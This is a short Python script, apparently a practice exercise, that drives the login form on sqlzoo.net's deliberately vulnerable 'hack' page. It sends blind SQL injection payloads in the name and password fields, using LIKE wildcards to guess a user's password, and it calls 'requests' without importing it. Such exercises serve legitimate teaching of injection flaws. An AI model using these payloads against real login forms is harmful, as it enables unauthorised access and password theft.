# https://www.blog.pythonlibrary.org/2012/06/08/python-101-how-to-submit-a-web-form/
# https://stackoverflow.com/questions/28932205/automatizing-web-browser-form-filling-in-python
# https://github.com/jmcarp/robobrowser



# https://mechanicalsoup.readthedocs.io/en/stable/tutorial.html
import mechanicalsoup as ms

url = "https://sqlzoo.net/hack/"
# br = mechanize.Browser()
br = ms.StatefulBrowser()
br.open(url)



""" html from 'passwd.pl'

<br><form>
  Please enter your name and password<br>
  <table><tbody><tr><td>name:</td><td> <input name="name"></td></tr>
  <tr><td>password:</td><td> <input type="password" name="password"></td></tr>
  </tbody></table>
  <input type="submit">
</form>

"""

name = "String" 
password = "String"
form = {"name" : name, "password" : password}


# https://3.python-requests.org/user/quickstart/#passing-parameters-in-urls
load = {"name" : "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='", "password" : "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='"}
r = requests.get("https://sqlzoo.net/hack/passwd.pl", params = load)
r.text

load2 = {"name" : "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%j%' AND password LIKE '%') AND ''='", "password" : "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%j%' AND password LIKE '%') AND ''='"}
r2 = requests.get("https://sqlzoo.net/hack/passwd.pl", params = load2)
print(r2.text)
# This works because the LIKE command uses % and _ as wildcards. The % wildcard matches any string, the _ wildcard matches a single character.

